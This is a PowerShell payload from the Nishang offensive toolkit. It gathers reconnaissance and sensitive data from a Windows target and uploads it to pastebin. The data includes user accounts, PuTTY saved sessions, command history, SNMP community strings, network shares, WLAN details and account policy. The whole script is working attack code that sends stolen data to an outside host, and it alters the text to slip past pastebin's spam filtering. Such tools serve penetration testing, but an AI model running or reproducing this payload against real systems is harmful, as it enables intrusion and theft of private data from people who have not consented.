<#
.SYNOPSIS
Nishang Payload which gathers juicy information from the target
and uploads it to pastebin as private paste.The info is also shown on the console.

.DESCRIPTION
This payload extracts information form registry and some commands. 
The information is then uploaded to pastebin as a private paste.
You must have a pastebin account to upload information as private.
The information available would be dependent on the privilege with
which the script would be executed.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.

.PARAMETER username
Username for the pastebin account where you would upload the data.

.PARAMETER password
Password for the pastebin account where you would upload the data.

.EXAMPLE
PS > Information_Gather dev_key username password

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $dev_key,
[Parameter(Position = 1, Mandatory = $True)] [String]$username,
[Parameter(Position = 2, Mandatory = $True)] [String]$password )

function Information_Gather 
{
$paste_name = "Info Dump" 
Function Post_http($url,$parameters) 
{ 
$http_request = New-Object -ComObject Msxml2.XMLHTTP 
$http_request.open("POST", $url, $false) 
$http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
$http_request.setRequestHeader("Content-length", $parameters.length); 
$http_request.setRequestHeader("Connection", "close") 
$http_request.send($parameters) 
$script:session_key=$http_request.responseText 
$http_request.responseText 
} 
function registry_values($regkey, $regvalue,$child) 
{ 
if ($child -eq "no"){$key = get-item $regkey} 
else{$key = get-childitem $regkey} 
$key | 
ForEach-Object { 
$values = Get-ItemProperty $_.PSPath 
ForEach ($value in $_.Property) 
{ 
if ($regvalue -eq "all") {$values.$value} 
elseif ($regvalue -eq "allname"){$value} 
else {$values.$regvalue;break} 
}}} 
$output = "Logged in users:`n" + (registry_values "hklm:\software\microsoft\windows nt\currentversion\profilelist" "profileimagepath") 
$output = $output + "`n Powershell environment:`n" + (registry_values "hklm:\software\microsoft\powershell" "allname") 
$output = $output + "`n Putty trusted hosts:`n" + (registry_values "hkcu:\software\simontatham\putty" "allname") 
$output = $output + "`n Putty saved sessions:`n" + (registry_values "hkcu:\software\simontatham\putty\sessions" "all") 
$output = $output + "`n Recently used commands:`n" + (registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no") 
$output = $output + "`n Shares on the machine:`n" + (registry_values "hklm:\SYSTEM\CurrentControlSet\services\LanmanServer\Shares" "all" "no") 
$output = $output + "`n Environment variables:`n" + (registry_values "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "all" "no") 
$output = $output + "`n More details for current user:`n" + (registry_values "hkcu:\Volatile Environment" "all" "no") 
$output = $output + "`n SNMP community strings:`n" + (registry_values "hklm:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no") 
$output = $output + "`n SNMP community strings for current user:`n" + (registry_values "hkcu:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no") 
$output = $output + "`n Installed Applications:`n" + (registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname") 
$output = $output + "`n Installed Applications for current user:`n" + (registry_values "hkcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname") 
$output = $output + "`n Domain Name:`n" + (registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\" "all" "no") 
$output = $output + "`n Contents of /etc/hosts:`n" + (get-content -path "C:\windows\System32\drivers\etc\hosts") 
$output = $output + "`n Running Services:`n" + (net start) 
$output = $output + "`n Account Policy:`n" + (net accounts) 
$output = $output + "`n Local users:`n" + (net user) 
$output = $output + "`n Local Groups:`n" + (net localgroup) 
$output = $output + "`n WLAN Info:`n" + (netsh wlan show all) 
$output = $output.Replace("/","\") #This is to stop pastebin from marking the paste as spam
$output = $output.Replace("www","uuu") #This is to stop pastebin from marking the paste as spam
Post_http "http://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$output&api_paste_private=2" 
$output
}
Information_Gather